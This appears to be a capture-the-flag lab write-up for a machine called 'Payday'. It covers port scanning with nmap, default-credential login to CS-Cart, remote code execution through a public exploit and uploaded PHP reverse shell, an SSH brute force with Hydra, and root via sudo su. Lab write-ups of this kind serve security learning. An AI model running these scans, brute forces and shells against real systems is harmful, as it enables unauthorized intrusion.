---
description: Use sudo su with full sudo rights
icon: linux
---

# Payday

## Summary

* Discovered multiple open services including Apache, IMAP/POP3, Samba, and SSH.
* CS-Cart web application on port 80 allowed default login as `admin:admin`.
* Used exploit for CS-Cart to get RCE via PHP webshell.
* SSH brute-forced user `patrick`'s credentials using Hydra.
* Privilege escalation via `sudo su` as `patrick` had full sudo access.



## 🧵 Let's Unpack

#### 🔎 Enumeration

```bash
nmap -A -T4 -sC -sN -oN nmapFull -p 22,80,110,139,143,445,993,995 192.168.167.39
```

* Port 80 hosted CS-Cart (Apache 2.2.4 with PHP 5.2.3)
* IMAP, POP3, and SSL variants running via Dovecot
* Samba open on ports 139 and 445
* SSH running OpenSSH 4.6p1

#### ⚡ Initial Foothold

* Web login worked with **default creds**: `admin:admin`
* Used CS-Cart exploit [EDB 48891](https://www.exploit-db.com/exploits/48891) for RCE
* Uploaded PHP reverse shell (Ivan Sincek’s from [revshells.com](https://revshells.com))
* Got a shell as `www-data`

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### 🪜 Privilege Escalation

* SSH brute-force was required for user `patrick`

<pre class="language-bash"><code class="lang-bash">hydra -L users.txt -P users.txt -e nsr -q ssh://192.168.167.39 -t 4 -w 5 -f
[22][ssh] host: 192.168.120.85   login: patrick   password: patrick

<strong>
</strong><strong>
</strong><strong>
</strong><strong># Login found: patrick : patrick
</strong>ssh patrick@192.168.167.39
</code></pre>

* Full `sudo` access for `patrick` allowed immediate escalation:

```bash
# using SUdo
sudo -l
>
User patrick may run the following commands on this host:
    (ALL) ALL

# simply doing sudo su gave us root shell
sudo su

## Boom bot proof.txt

```

***

